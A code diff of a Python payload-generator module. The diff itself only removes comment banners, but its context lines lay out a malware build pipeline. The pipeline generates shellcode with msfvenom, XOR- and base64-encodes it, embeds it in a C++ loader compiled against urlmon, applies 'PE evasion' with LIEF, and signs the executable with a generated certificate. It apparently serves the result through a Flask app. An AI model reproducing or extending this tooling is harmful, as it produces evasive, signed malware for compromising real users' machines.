@@ -13,20 +13,12 @@ from core.logger import log
 from core.utils import generate_id
 import config
 
-
-# ─────────────────────────────────────────
-# 📂 PATHS
-# ─────────────────────────────────────────
 BASE_DIR = os.path.dirname(__file__)
 LOADER_DIR = os.path.join(BASE_DIR, "loaders")
 OUTPUT_DIR = os.path.join(BASE_DIR, "output")
 
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 
-
-# ─────────────────────────────────────────
-# 🎓 CERT CLASS (UNCHANGED LOGIC)
-# ─────────────────────────────────────────
 class Certificate:
     def __init__(self):
         self.certificates = {
@@ -46,10 +38,6 @@ class Certificate:
     def random(self):
         return random.choice(list(self.certificates.items()))
 
-
-# ─────────────────────────────────────────
-# 🚀 MAIN GENERATOR
-# ─────────────────────────────────────────
 def generate_payload(data):
     """
     FULL REAL PAYLOAD PIPELINE (your logic preserved)
@@ -78,9 +66,6 @@ def generate_payload(data):
             f"payload_{loader_name}_{cert_name}_{HEX_KEY}.exe"
         )
 
-        # ─────────────────────────────
-        # 1. SHELLCODE
-        # ─────────────────────────────
         log("Generating shellcode via msfvenom")
 
         subprocess.run([
@@ -93,18 +78,12 @@ def generate_payload(data):
             "-o", SHELLCODE_RAW
         ], check=True)
 
-        # ─────────────────────────────
-        # 2. ENCODE
-        # ─────────────────────────────
         with open(SHELLCODE_RAW, "rb") as f:
             sc = f.read()
 
         xor_encoded = bytes([b ^ xor_key for b in sc])
         b64_encoded = base64.b64encode(xor_encoded).decode()
 
-        # ─────────────────────────────
-        # 3. HEADER
-        # ─────────────────────────────
         with open(HEADER_FILE, "w") as f:
             f.write("#pragma once\n")
             f.write("const char *b64_shellcode =\n")
@@ -115,9 +94,6 @@ def generate_payload(data):
             f.write(";\n")
             f.write(f"const unsigned char XOR_KEY = 0x{HEX_KEY};\n")
 
-        # ─────────────────────────────
-        # 4. COPY LOADER
-        # ─────────────────────────────
         loader_src = os.path.join(LOADER_DIR, f"{loader_name}.cpp")
 
         if not os.path.exists(loader_src):
@@ -126,9 +102,6 @@ def generate_payload(data):
         payload_cpp = os.path.join(temp_dir, "payload.cpp")
         shutil.copy(loader_src, payload_cpp)
 
-        # ─────────────────────────────
-        # 5. COMPILE
-        # ─────────────────────────────
         log("Compiling payload")
 
         subprocess.run([
@@ -143,9 +116,6 @@ def generate_payload(data):
             "-lurlmon"
         ], check=True)
 
-        # ─────────────────────────────
-        # 6. PE MODIFY (LIEF)
-        # ─────────────────────────────
         log("Applying PE evasion")
 
         try:
@@ -167,9 +137,6 @@ def generate_payload(data):
         except Exception as e:
             log(f"LIEF warning: {e}")
 
-        # ─────────────────────────────
-        # 7. SIGN
-        # ─────────────────────────────
         log("Signing payload")
 
         key_path = os.path.join(temp_dir, "key.pem")
@@ -204,9 +171,6 @@ def generate_payload(data):
             "-out", FINAL_EXE
         ], check=True)
 
-        # ─────────────────────────────
-        # 8. READ + STORE
-        # ─────────────────────────────
         with open(FINAL_EXE, "rb") as f:
             binary_data = f.read()
 
@@ -222,7 +186,6 @@ def generate_payload(data):
             "payload": base64.b64encode(binary_data).decode()
         }
 
-        # SAFE STATE STORE
         try:
             from flask import current_app
             if hasattr(current_app, "state"):
